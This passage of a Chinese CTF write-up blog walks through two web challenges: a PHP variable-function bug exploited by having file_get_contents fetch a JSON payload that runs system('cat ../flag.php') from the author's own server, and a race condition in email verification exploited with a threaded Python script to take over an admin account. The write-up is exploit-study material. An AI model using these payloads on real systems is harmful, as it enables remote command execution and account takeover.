class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$d</span>[<span class="string">&#x27;f&#x27;</span>](<span class="variable">$d</span>[<span class="string">&#x27;d&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$b</code>为<code>$a</code>经过<code>gencodeurl()</code>处理后的值，然后以 <code>$b</code> 为文件名，将其中的内容赋给<code>$c</code>，再对该内容进行json解码赋值给<code>$d</code>。</p>
<p>由<code> $d[&#39;f&#39;]($d[&#39;d&#39;]);</code>可以看出来最终<code>$d</code>解码得到的应该是一个关联数组，且有键<code>f</code>和<code>d</code>，然后它们的值构成一个可变函数，<code>$d[&#39;f&#39;]</code>为函数名，<code>$d[&#39;d&#39;]</code>为参数。</p>
<p>这里就是我们可以利用的地方，想办法构造<code>system(&#39;cat ../flag&#39;)</code>，这样我们就可以读到上面的flag了，所以我们将<code>[&quot;f&quot;=&gt;&quot;system&quot;,&quot;d&quot;=&gt;&quot;&#39;cat ../flag.php&#39;&quot;]</code> </p>
<p>JSON编码一下得到：<code>&#123;&quot;f&quot;:&quot;system&quot;,&quot;d&quot;:&quot;cat ../flag.php&quot;&#125;</code>，这就是<code>file_get_contents</code>应该读到的文件内容，下面就是如何让读到这个文件。</p>
<p>看一下<code>gencodeurl</code>函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$e</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        <span class="variable">$f</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$a</span>, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        <span class="variable">$g</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$a</span>, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$f</span> = <span class="string">&#x27;good&#x27;</span>;</span><br><span class="line">        <span class="variable">$g</span> = <span class="string">&#x27;web.com&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$b</span> = <span class="string">&#x27;http://&#x27;</span> . <span class="variable">$f</span> . <span class="variable">$g</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不难看出，当<code>$a</code>的长度大于40时，返回值是<code>http://</code>拼接<code>$a</code>的31<del>35位再拼接 <code>$a</code>的11</del>20位，也就是说我们可控的只有15位。</p>
<p>我们将上面构造内容命名为文件<code>1</code>，放到自己服务器上（假设ip位123.123.1.123），可以看到<code>123.123.1.123/1</code>刚好15位，这样我们构造下面这个<code>$a</code>时：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaa11.8.105/1aaaaaaaaaa129.2aaaaaa</span><br></pre></td></tr></table></figure>

<p>返回值就会为：<code>http://123.123.1.123/1</code>，通过<code>file_get_contents</code>就可以从我们的服务器上获取内容了。</p>
<p><img src="/.site//20191025011222610.png" alt="在这里插入图片描述"></p>
<h1 id="一个hackerone的有趣的漏洞的复现的题目"><a href="#一个hackerone的有趣的漏洞的复现的题目" class="headerlink" title="一个hackerone的有趣的漏洞的复现的题目"></a>一个hackerone的有趣的漏洞的复现的题目</h1><p>题目存在git泄露，得到源码，进行代码审计。</p>
<p>首先看一下<code>index.php</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;init.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location: ./login.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$userObj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">zUser</span>();</span><br><span class="line"><span class="variable">$user</span> = z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">get_attrs</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$userObj</span>-&gt;<span class="title function_ invoke__">is_admin</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">file_exists</span>(FLAGFILE))&#123;</span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">&quot;WELL DONE! &quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(FLAGFILE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到要想获得flag，需要通过<code>is_admin()</code>的验证，跟踪这个函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//class.user.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_admin</span>(<span class="params"><span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">validate_username</span>(<span class="variable">$username</span>))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$user</span> = z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">get_attrs</span>(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$user</span>[<span class="string">&#x27;is_admin&#x27;</span>] === <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取$username的所有信息</span></span><br><span class="line"><span class="comment">//从前面可以看到$users[&#x27;attrs&#x27;][$username] = array(&quot;email&quot; =&gt; $email, &quot;is_admin&quot; =&gt; 0, &quot;email_verify&quot; =&gt; 0, &quot;token&quot; =&gt; &quot;&quot;);</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_attrs</span>(<span class="params"><span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$users</span> = z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">get_all_users</span>();</span><br><span class="line">	<span class="keyword">if</span>(!z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">is_exists</span>(<span class="variable">$username</span>))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$users</span>[<span class="string">&#x27;attrs&#x27;</span>][<span class="variable">$username</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要想验证通过，需要<code>$user</code>里的<code>is_admin</code>值为1，发现这边并没有什么可以利用的点，继续审计，重点放在如何可以登录admin的账号，发现该系统存在切换关联账号的功能：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//switch.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;init.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location: ./login.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$userObj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">zUser</span>();</span><br><span class="line"><span class="variable">$user</span> = z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">get_attrs</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$users</span> = z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">get_relate_users</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$username</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>])?<span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]):<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> != <span class="literal">false</span> &amp;&amp; z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">is_exists</span>(<span class="variable">$username</span>))&#123;</span><br><span class="line">	<span class="variable">$to_user</span> = z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">get_attrs</span>(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$user</span>[<span class="string">&#x27;email_verify&#x27;</span>] === <span class="number">1</span> &amp;&amp; <span class="variable">$to_user</span>[<span class="string">&#x27;email_verify&#x27;</span>] === <span class="number">1</span> &amp;&amp; <span class="variable">$user</span>[<span class="string">&#x27;email&#x27;</span>] === <span class="variable">$to_user</span>[<span class="string">&#x27;email&#x27;</span>])&#123;</span><br><span class="line">		<span class="variable">$userObj</span>-&gt;<span class="title function_ invoke__">login2</span>(<span class="variable">$username</span>);</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ./&#x27;</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//class.user.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login2</span>(<span class="params"><span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$username</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(!z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">validate_username</span>(<span class="variable">$username</span>))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到<code>login2</code>没有其他任何的验证，也就是说如果邮箱相同且均认证了，那么不同账号就可以相互切换登录。</p>
<p>再想到一开始的注册页面给了<code>admin</code>的邮箱为<code>ambulong@vulnspy.com</code>，那么思路应该就是注册一个账号，并关联到<code>admin</code>的邮箱上，这样就可以切换到<code>admin</code>帐号了。</p>
<p>直接绑定管理员的邮箱肯定是不行的，该系统还存在修改绑定邮箱的功能，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chgemail.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;init.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location: ./&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$userObj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">zUser</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$userObj</span>-&gt;<span class="title function_ invoke__">is_admin</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;FORBIDDEN&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">chktoken</span>())&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;INVALID REQUEST&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$email</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>])?<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]):<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$userObj</span>-&gt;<span class="title function_ invoke__">chg_email</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$email</span>))</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;SUCCESS&#x27;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;FAILED&#x27;</span>);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//跟一下chg_email()函数</span></span><br><span class="line"><span class="comment">//class.user.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">chg_email</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$email</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">is_exists</span>(<span class="variable">$username</span>))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$email</span> == <span class="literal">false</span> || !z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">validate_email</span>(<span class="variable">$email</span>))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$user</span> = z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">get_attrs</span>(<span class="variable">$username</span>);</span><br><span class="line">	<span class="variable">$old_email</span> = <span class="variable">$user</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">	<span class="variable">$emails</span> = z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">get_emails</span>();</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$emails</span>[<span class="variable">$old_email</span>]))&#123;</span><br><span class="line">		<span class="variable">$emails</span>[<span class="variable">$old_email</span>] = <span class="title function_ invoke__">array_diff</span>(<span class="variable">$emails</span>[<span class="variable">$old_email</span>], <span class="keyword">array</span>(<span class="variable">$username</span>));</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$emails</span>[<span class="variable">$old_email</span>] == <span class="literal">false</span>)&#123;</span><br><span class="line">			<span class="keyword">unset</span>(<span class="variable">$emails</span>[<span class="variable">$old_email</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">update_attr</span>(<span class="variable">$username</span>, <span class="string">&#x27;email_verify&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">	z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">update_attr</span>(<span class="variable">$username</span>, <span class="string">&#x27;email&#x27;</span>, <span class="variable">$email</span>);</span><br><span class="line">	z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">update_attr</span>(<span class="variable">$username</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">	<span class="variable">$us</span> = @<span class="title function_ invoke__">is_array</span>(<span class="variable">$emails</span>[<span class="variable">$email</span>])?<span class="variable">$emails</span>[<span class="variable">$email</span>]:<span class="keyword">array</span>();</span><br><span class="line">	<span class="variable">$emails</span>[<span class="variable">$email</span>] = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$us</span>, <span class="keyword">array</span>(<span class="variable">$username</span>));</span><br><span class="line">	<span class="keyword">return</span> z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">update_emails</span>(<span class="variable">$emails</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到当你重新绑定邮箱的时候，<code>email_verify</code>就会变为0，而我们得不到管理员邮箱的认证，就无法绑定成功。所以要想成功绑定，还得取看一下认证功能的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//verify.php</span></span><br><span class="line"><span class="title function_ invoke__">f</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$token</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>])?<span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]):<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$username</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>])?<span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]):<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$token</span> == <span class="literal">false</span> || <span class="variable">$username</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;INVALID INPUT&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$userObj</span>-&gt;<span class="title function_ invoke__">verify_email</span>(<span class="variable">$username</span>, <span class="variable">$token</span>))&#123;</span><br><span class="line">		<span class="variable">$userObj</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>);</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location: ./&#x27;</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;INVALID TOKEN OR USERNAME&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//跟一下verify_email()</span></span><br><span class="line"><span class="comment">//class.user.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_email</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$token</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">is_exists</span>(<span class="variable">$username</span>))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$token</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$token</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$token</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$user</span> = z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">get_attrs</span>(<span class="variable">$username</span>);<span class="comment">//取出所有信息</span></span><br><span class="line">	<span class="variable">$real_token</span> = <span class="variable">$user</span>[<span class="string">&quot;token&quot;</span>];			<span class="comment">//取出用户的token</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$real_token</span>) !== <span class="title function_ invoke__">md5</span>(<span class="variable">$token</span>))&#123;	<span class="comment">//验证token是否正确</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//----存在条件竞争的地方----</span></span><br><span class="line">	z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">update_attr</span>(<span class="variable">$username</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;&#x27;</span>);			<span class="comment">//清空token</span></span><br><span class="line">	z<span class="title class_">UserFile</span>::<span class="title function_ invoke__">update_attr</span>(<span class="variable">$username</span>, <span class="string">&#x27;email_verify&#x27;</span>, <span class="number">1</span>);	<span class="comment">//认证成功</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正常的认证流程应该是：</p>
<ul>
<li>① 填写绑定邮箱 </li>
<li>② 收到带有token的认证邮件 </li>
<li>③ 带着用户名和token去访问认证页面 </li>
<li>④ token验证正确 </li>
<li>⑤  <code>email_verify</code>置为1，前面填写的邮箱绑定成功</li>
</ul>
<p>而我们可以利用条件竞争，在上述正常流程的第4和第5步之间请求绑定<code>admin</code>的邮箱，由于没有验证<code>$email</code>的状态，所以要绑定的<code>$email</code>被重置为了<code>admin</code>的邮箱，这时再执行第5步，则可以认证成功。</p>
<p>于是我们先注册一个账号，并且绑定自己的邮箱来得到token，然后再访问认证链接的同时快速的，请求绑定<code>admin</code>的邮箱，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://114.55.36.69:8023/&quot;</span></span><br><span class="line">verify_url= <span class="string">&quot;/verify.php?token=oust3dEPSxpoZ9wKUVjo8ZFleaGdZaff&amp;username=lethe3&quot;</span></span><br><span class="line">SESSION=<span class="string">&quot;9gr7bgt3ht65r3hbe3sgcm7032&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_email</span>():</span><br><span class="line">    res = requests.get(url + verify_url)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset_email</span>():</span><br><span class="line">    reset_url = url + <span class="string">&quot;/chgemail.php?token=QNgbstcy&quot;</span></span><br><span class="line">    cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: SESSION&#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;email&quot;</span>: <span class="string">&quot;ambulong@vulnspy.com&quot;</span>, <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">    res=requests.post(reset_url, cookies=cookies, data=data)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    t1 = threading.Thread(target=verify_email, args=())</span><br><span class="line">    t2 = threading.Thread(target=reset_email, args=())</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>运行后刷新页面，发现已经成功绑定管理员邮箱：<br><img src="/.site//2019102516365379.png" alt="在这里插入图片描述"></p>
<p>切换<code>admin</code>账号即可：<br><img src="/.site//20191025163716493.png" alt="在这里插入图片描述"></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Lethe</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://lethe.site/2019/10/25/Web%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B8%AA%E4%BA%BA%E8%B5%9B%E7%BB%83%E4%B9%A0/">https://lethe.site/2019/10/25/Web%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B8%AA%E4%BA%BA%E8%B5%9B%E7%BB%83%E4%B9%A0/</a></span>
                    </p>
